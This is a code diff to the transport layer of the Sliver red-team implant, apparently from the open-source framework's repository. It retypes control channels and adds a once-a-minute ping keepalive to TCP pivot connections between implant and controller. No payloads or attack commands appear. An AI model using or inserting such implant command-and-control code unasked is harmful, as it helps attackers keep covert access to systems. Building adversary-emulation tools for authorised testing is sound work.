@@ -35,6 +35,7 @@ import (
 
 	// {{if .Config.MTLSc2Enabled}}
 	"github.com/bishopfox/sliver/implant/sliver/transports/mtls"
+
 	// {{end}}
 
 	// {{if .Config.WGc2Enabled}}
@@ -57,6 +58,7 @@ import (
 	"fmt"
 
 	"github.com/bishopfox/sliver/implant/sliver/transports/pivotclients"
+	"google.golang.org/protobuf/proto"
 
 	// {{end}}
 
@@ -73,7 +75,7 @@ type Connection struct {
 	Send    chan *pb.Envelope
 	Recv    chan *pb.Envelope
 	IsOpen  bool
-	ctrl    chan bool
+	ctrl    chan struct{}
 	cleanup func()
 	once    *sync.Once
 	tunnels *map[uint64]*Tunnel
@@ -273,7 +275,7 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 
 	send := make(chan *pb.Envelope)
 	recv := make(chan *pb.Envelope)
-	ctrl := make(chan bool)
+	ctrl := make(chan struct{})
 	connection := &Connection{
 		Send:    send,
 		Recv:    recv,
@@ -362,7 +364,7 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 
 	send := make(chan *pb.Envelope)
 	recv := make(chan *pb.Envelope)
-	ctrl := make(chan bool)
+	ctrl := make(chan struct{})
 	connection := &Connection{
 		Send:    send,
 		Recv:    recv,
@@ -443,7 +445,7 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 
 	send := make(chan *pb.Envelope)
 	recv := make(chan *pb.Envelope)
-	ctrl := make(chan bool, 1)
+	ctrl := make(chan struct{}, 1)
 	connection := &Connection{
 		Send:    send,
 		Recv:    recv,
@@ -457,7 +459,7 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 			log.Printf("[http] lost connection, cleanup...")
 			// {{end}}
 			close(send)
-			ctrl <- true
+			ctrl <- struct{}{}
 			close(recv)
 		},
 	}
@@ -546,7 +548,7 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 
 	send := make(chan *pb.Envelope)
 	recv := make(chan *pb.Envelope)
-	ctrl := make(chan bool, 1)
+	ctrl := make(chan struct{}, 1)
 	connection := &Connection{
 		Send:    send,
 		Recv:    recv,
@@ -560,7 +562,7 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 			log.Printf("[dns] lost connection, cleanup...")
 			// {{end}}
 			close(send)
-			ctrl <- true // Stop polling
+			ctrl <- struct{}{} // Stop polling
 			close(recv)
 		},
 	}
@@ -636,7 +638,8 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 
 	send := make(chan *pb.Envelope)
 	recv := make(chan *pb.Envelope)
-	ctrl := make(chan bool, 1)
+	ctrl := make(chan struct{}, 1)
+	pingCtrl := make(chan struct{}, 1)
 	connection := &Connection{
 		Send:    send,
 		Recv:    recv,
@@ -649,14 +652,34 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 			// {{if .Config.Debug}}
 			log.Printf("[tcp-pivot] lost connection, cleanup...")
 			// {{end}}
+			pingCtrl <- struct{}{}
 			close(send)
-			ctrl <- true
+			ctrl <- struct{}{}
 			close(recv)
 		},
 	}
 
 	go func() {
-		defer connection.Cleanup()
+		for {
+			select {
+			case <-pingCtrl:
+				return
+			case <-time.After(time.Minute):
+				data, _ := proto.Marshal(&pb.PivotPing{
+					Nonce: uint32(time.Now().UnixNano()),
+				})
+				connection.Send <- &pb.Envelope{
+					Type: pb.MsgPivotPing,
+					Data: data,
+				}
+			}
+		}
+	}()
+
+	go func() {
+		defer func() {
+			connection.Cleanup()
+		}()
 		for envelope := range send {
 			// {{if .Config.Debug}}
 			log.Printf("[tcp-pivot] send loop envelope type %d\n", envelope.Type)
@@ -671,6 +694,12 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 			envelope, err := pivot.ReadEnvelope()
 			if err == io.EOF {
 				break
+			}
+			if envelope.Type == pb.MsgPivotPing {
+				// {{if .Config.Debug}}
+				log.Printf("[tcp-pivot] received peer pong")
+				// {{end}}
+				continue
 			}
 			if err == nil {
 				recv <- envelope
